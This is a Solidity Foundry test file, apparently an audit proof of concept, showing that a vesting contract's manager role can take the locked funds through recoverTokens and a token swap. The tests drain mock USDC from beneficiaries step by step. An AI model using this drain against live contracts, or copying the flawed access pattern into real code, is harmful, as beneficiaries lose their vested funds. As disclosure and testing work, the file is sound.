import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import {LinearUnlocker} from "../src/LinearUnlockerVuln.sol";

/**
 * PoC: LinearUnlocker MANAGER_ROLE can rug-pull the lockedToken (vesting funds).
 *
 * Bug: `recoverTokens(IERC20, address, uint256)` is gated only by MANAGER_ROLE,
 *      but it accepts ANY token, INCLUDING `lockedToken` itself.
 *
 * Combined with `setLockedToken` (ENG_MANAGER_ROLE) — a single compromised key
 * can swap lockedToken to a worthless token, recover the original lockedToken,
 * or just drain via recoverTokens.
 *
 * In this PoC, only a single MANAGER_ROLE compromise is needed.
 */

contract MockERC20 {
    string public name;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;

    constructor(string memory _n){ name = _n; }
    function mint(address to, uint256 a) external { totalSupply += a; balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns(bool){
        require(balanceOf[msg.sender] >= a); balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;}
    function transferFrom(address f, address t, uint256 a) external returns(bool){
        require(balanceOf[f] >= a);
        require(allowance[f][msg.sender] == type(uint256).max || allowance[f][msg.sender] >= a);
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;}
    function approve(address s, uint256 a) external returns(bool){ allowance[msg.sender][s] = a; return true; }
}

contract LinearUnlockerRugPoC is Test {
    LinearUnlocker unlocker;
    MockERC20 usdc;
    MockERC20 trash;

    address imAdmin = address(0xAD11);
    address engAdmin = address(0xAD22);
    address imManager = address(0xB0BAD);   // <-- attacker (single role compromise)
    address engManager = address(0xE99);
    address beneficiary = address(0xB33F);

    function setUp() public {
        usdc = new MockERC20("USDC");
        trash = new MockERC20("TRASH");

        unlocker = new LinearUnlocker(LinearUnlocker.Init({
            lockedToken: IERC20(address(usdc)),
            beneficiary: beneficiary,
            startTimestamp: uint64(block.timestamp),
            durationSeconds: uint64(365 days),
            engAdmin: engAdmin,
            engManager: engManager,
            imAdmin: imAdmin,
            imManager: imManager
        }));

        // Fund the unlocker with 1,000,000 USDC
        usdc.mint(address(unlocker), 1_000_000e18);
    }

    /// @notice Baseline: beneficiary can release vested amount normally
    function test_PoC_Baseline_NormalVesting() public {
        vm.warp(block.timestamp + 365 days); // fully vested
        uint256 balBefore = usdc.balanceOf(beneficiary);
        vm.prank(beneficiary);
        unlocker.release();
        uint256 balAfter = usdc.balanceOf(beneficiary);
        assertEq(balAfter - balBefore, 1_000_000e18);
        assertEq(usdc.balanceOf(address(unlocker)), 0);
    }

    /// @notice PoC: A single compromised MANAGER_ROLE drains lockedToken
    function test_PoC_RugRecoverLockedToken() public {
        uint256 totalVested = 1_000_000e18;
        address attacker = address(0xA77A4);

        // Time passes, vesting begins
        vm.warp(block.timestamp + 182 days); // 50% vested
        // Beneficiary already released 0 (hasn't claimed yet)

        // ========== ATTACK ==========
        // Compromised imManager (MANAGER_ROLE) calls recoverTokens
        vm.prank(imManager);
        unlocker.recoverTokens(IERC20(address(usdc)), attacker, totalVested);

        // ========== POST-CONDITION ==========
        assertEq(usdc.balanceOf(address(unlocker)), 0);
        assertEq(usdc.balanceOf(attacker), totalVested);

        // Now beneficiary tries to release — gets NOTHING
        vm.warp(block.timestamp + 183 days); // 100% vested
        uint256 balBefore = usdc.balanceOf(beneficiary);
        vm.prank(beneficiary);
        unlocker.release();
        uint256 balAfter = usdc.balanceOf(beneficiary);
        assertEq(balAfter - balBefore, 0, "BUG: beneficiary gets 0 because token was rug-pulled");
    }

    /// @notice PoC: combined — ENG_MANAGER swap, MANAGER recover
    /// ENG_MANAGER swaps lockedToken to worthless token, then beneficiary
    /// "releases" worthless token, original USDC is free for recoverTokens.
    function test_PoC_SwapAndRecover() public {
        address attacker = address(0xA77A5);

        // ENG_MANAGER swaps lockedToken to TRASH
        vm.prank(engManager);
        unlocker.setLockedToken(IERC20(address(trash)));

        // Beneficiary now tries to release — but only TRASH balance is "vested"
        // (vestedAmount is computed using lockedToken.balanceOf(this) which is 0)
        uint256 balBefore = usdc.balanceOf(beneficiary);
        uint256 trashBefore = trash.balanceOf(beneficiary);
        vm.prank(beneficiary);
        unlocker.release();
        // Beneficiary gets nothing (TRASH balance of unlocker = 0)
        assertEq(trash.balanceOf(beneficiary) - trashBefore, 0);
        assertEq(usdc.balanceOf(beneficiary) - balBefore, 0);

        // Original USDC is now free for anyone to recover
        uint256 usdcInUnlocker = usdc.balanceOf(address(unlocker));
        assertEq(usdcInUnlocker, 1_000_000e18, "original USDC still in contract");

        // MANAGER recovers the original USDC
        vm.prank(imManager);
        unlocker.recoverTokens(IERC20(address(usdc)), attacker, usdcInUnlocker);

        assertEq(usdc.balanceOf(attacker), 1_000_000e18);
    }

    /// @notice Severity: vesting schedule becomes meaningless for ANY party
    function test_PoC_InvariantsBroken() public {
        // INVARIANT 1: lockedToken balance == total vested amount
        assertEq(usdc.balanceOf(address(unlocker)), 1_000_000e18, "initial balance matches vesting");

        // Attack
        vm.prank(imManager);
        unlocker.recoverTokens(IERC20(address(usdc)), address(0xD8A1A0), 500_000e18);

        // After: balance != remaining vesting allocation
        // At t=now, vested = 0 (just started). But balance drained.
        assertEq(usdc.balanceOf(address(unlocker)), 500_000e18);

        // Now beneficiary's vestedAmount is based on remaining balance
        // (vestedAmount = balanceOf(this) + released = 500_000 + 0 = 500_000)
        // but this should have been 1_000_000 since vesting started
        vm.warp(block.timestamp + 365 days); // fully vested
        uint256 vested = unlocker.vestedAmount(address(usdc), uint64(block.timestamp));
        // vestedAmount formula: (balanceOf(this) + released) capped at totalAllocation
        // After attack: balanceOf(this) = 500_000, released = 0
        // vested = 500_000 (50% of original 1M)
        assertLt(vested, 1_000_000e18, "BUG: vested amount reduced after rug");
    }
}
